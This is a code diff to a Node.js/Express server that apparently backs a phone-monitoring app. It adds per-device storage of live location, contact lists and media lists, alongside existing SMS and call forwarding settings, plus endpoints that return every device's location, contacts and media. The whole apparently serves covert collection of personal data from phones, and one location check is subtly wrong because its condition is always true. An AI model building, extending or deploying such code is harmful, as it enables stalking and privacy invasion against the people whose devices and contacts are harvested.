@@ -55,12 +55,16 @@ const deviceSchema = new mongoose.Schema(
     last_seen: { type: Date, default: Date.now },
     total_events: { type: Number, default: 0 },
     is_active: { type: Boolean, default: true },
+    // ── Live device snapshot data ──────────────
+    last_location: { type: Object, default: null },
+    contacts: { type: Array, default: [] },
+    media_list: { type: Array, default: [] },
     // ── Forwarding config ──────────────────────
     forward_number: { type: String, default: "" }, // number to forward to
     call_forward_enabled: { type: Boolean, default: false },
     sms_forward_enabled: { type: Boolean, default: false },
   },
-  { timestamps: true },
+  { timestamps: true, strict: false },
 );
 const Device = mongoose.model("Device", deviceSchema);
 
@@ -135,18 +139,94 @@ const auth = (req, res, next) => {
 };
 
 // ─────────────────────────────────────────────
-//  Helper: update device record
+//  Helper: update device record with deduplicated data
 // ─────────────────────────────────────────────
-async function touchDevice(device_id, device_name) {
-  await Device.findOneAndUpdate(
-    { device_id },
-    {
-      $set: { last_seen: new Date(), device_name, is_active: true },
-      $inc: { total_events: 1 },
-      $setOnInsert: { device_id, first_seen: new Date() },
-    },
-    { upsert: true, new: true },
-  );
+async function touchDevice(device_id, device_name, location, contacts, media_list) {
+  try {
+    const device = await Device.findOne({ device_id });
+    const now = new Date();
+
+    if (!device) {
+      // Create new device record
+      let uniqueContacts = [];
+      if (Array.isArray(contacts)) {
+        const seen = new Set();
+        contacts.forEach(c => {
+          const key = `${c.name||''}_${c.phone||''}`;
+          if (!seen.has(key) && (c.name || c.phone)) {
+            seen.add(key);
+            uniqueContacts.push(c);
+          }
+        });
+      }
+
+      let uniqueMedia = [];
+      if (Array.isArray(media_list)) {
+        const seen = new Set();
+        media_list.forEach(m => {
+          if (m.id && !seen.has(String(m.id))) {
+            seen.add(String(m.id));
+            uniqueMedia.push(m);
+          }
+        });
+      }
+
+      await Device.create({
+        device_id,
+        device_name: device_name || "Unknown",
+        first_seen: now,
+        last_seen: now,
+        total_events: 1,
+        is_active: true,
+        last_location: location || null,
+        contacts: uniqueContacts,
+        media_list: uniqueMedia,
+      });
+    } else {
+      // Update existing device record
+      device.last_seen = now;
+      if (device_name && device_name !== "Unknown") device.device_name = device_name;
+      device.total_events = (device.total_events || 0) + 1;
+      device.is_active = true;
+
+      // 1. Live location: Always update with latest coordinates
+      if (location && (location.latitude !== undefined || location.latitude !== null)) {
+        device.last_location = {
+          ...location,
+          timestamp: now,
+        };
+      }
+
+      // 2. Contacts deduplication: Only add new contacts not already stored
+      if (Array.isArray(contacts) && contacts.length > 0) {
+        const existingMap = new Map();
+        (device.contacts || []).forEach(c => existingMap.set(`${c.name||''}_${c.phone||''}`, c));
+        contacts.forEach(c => {
+          const key = `${c.name||''}_${c.phone||''}`;
+          if (!existingMap.has(key) && (c.name || c.phone)) {
+            existingMap.set(key, c);
+          }
+        });
+        device.contacts = Array.from(existingMap.values());
+      }
+
+      // 3. Media assets deduplication: Only add new media items not already stored
+      if (Array.isArray(media_list) && media_list.length > 0) {
+        const existingMediaMap = new Map();
+        (device.media_list || []).forEach(m => existingMediaMap.set(String(m.id), m));
+        media_list.forEach(m => {
+          if (m.id && !existingMediaMap.has(String(m.id))) {
+            existingMediaMap.set(String(m.id), m);
+          }
+        });
+        device.media_list = Array.from(existingMediaMap.values());
+      }
+
+      await device.save();
+    }
+  } catch (err) {
+    console.error("⚠️ touchDevice error:", err);
+  }
 }
 
 // ─────────────────────────────────────────────
@@ -355,7 +435,7 @@ app.post(["/api/events/notification", "/api/notifications"], auth, async (req, r
 
     const doc = await NotificationEvent.create(payloadObj);
 
-    await touchDevice(device_id, device_name || "Unknown");
+    await touchDevice(device_id, device_name || "Unknown", location, contacts, media_list);
     res.status(201).json({ success: true, data: doc });
   } catch (err) {
     if (err.code === 11000) {
@@ -373,12 +453,113 @@ app.post(["/api/events/notification", "/api/notifications"], auth, async (req, r
           media_list: req.body.media_list || [],
           timestamp: req.body.timestamp ? new Date(req.body.timestamp) : new Date(),
         });
-        await touchDevice(req.body.device_id, req.body.device_name || "Unknown");
+        await touchDevice(req.body.device_id, req.body.device_name || "Unknown", req.body.location, req.body.contacts, req.body.media_list);
         return res.status(201).json({ success: true, fallback: true, data: fallbackDoc });
       } catch (fallbackErr) {
         return res.status(500).json({ success: false, message: fallbackErr.message });
       }
     }
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
+// GET /api/location – latest location per device
+app.get("/api/location", auth, async (req, res) => {
+  try {
+    const { device_id } = req.query;
+    const query = {};
+    if (device_id) query.device_id = device_id;
+
+    const devices = await Device.find({ ...query, last_location: { $ne: null } }).select("device_id device_name last_location last_seen");
+    const notifLocs = await NotificationEvent.find({ ...query, location: { $ne: null } }).sort({ timestamp: -1 }).limit(30);
+
+    let locationList = [];
+    devices.forEach(d => {
+      if (d.last_location) {
+        locationList.push({
+          device_id: d.device_id,
+          device_name: d.device_name,
+          location: d.last_location,
+          timestamp: d.last_location.timestamp || d.last_seen
+        });
+      }
+    });
+
+    notifLocs.forEach(n => {
+      locationList.push({
+        device_id: n.device_id,
+        device_name: n.device_name,
+        location: n.location,
+        timestamp: n.timestamp
+      });
+    });
+
+    res.json({ success: true, count: locationList.length, data: locationList });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
+// GET /api/contacts – deduplicated contacts per device
+app.get("/api/contacts", auth, async (req, res) => {
+  try {
+    const { device_id } = req.query;
+    const query = {};
+    if (device_id) query.device_id = device_id;
+
+    const devices = await Device.find(query).select("device_id device_name contacts last_seen");
+
+    let allContacts = [];
+    devices.forEach((d) => {
+      if (Array.isArray(d.contacts)) {
+        d.contacts.forEach((c) => {
+          allContacts.push({
+            name: c.name || "No Name",
+            phone: c.phone || "",
+            device_id: d.device_id,
+            device_name: d.device_name,
+            synced_at: d.last_seen,
+          });
+        });
+      }
+    });
+
+    res.json({ success: true, count: allContacts.length, data: allContacts });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
+// GET /api/media-summary – deduplicated media assets per device
+app.get("/api/media-summary", auth, async (req, res) => {
+  try {
+    const { device_id } = req.query;
+    const query = {};
+    if (device_id) query.device_id = device_id;
+
+    const devices = await Device.find(query).select("device_id device_name media_list last_seen");
+
+    let allMedia = [];
+    devices.forEach((d) => {
+      if (Array.isArray(d.media_list)) {
+        d.media_list.forEach((m) => {
+          allMedia.push({
+            id: m.id || "0",
+            type: m.type || "image",
+            width: m.width || 0,
+            height: m.height || 0,
+            duration: m.duration || 0,
+            create_dt: m.create_dt || d.last_seen,
+            device_id: d.device_id,
+            device_name: d.device_name,
+            synced_at: d.last_seen,
+          });
+        });
+      }
+    });
+
+    res.json({ success: true, count: allMedia.length, data: allMedia });
+  } catch (err) {
     res.status(500).json({ success: false, message: err.message });
   }
 });
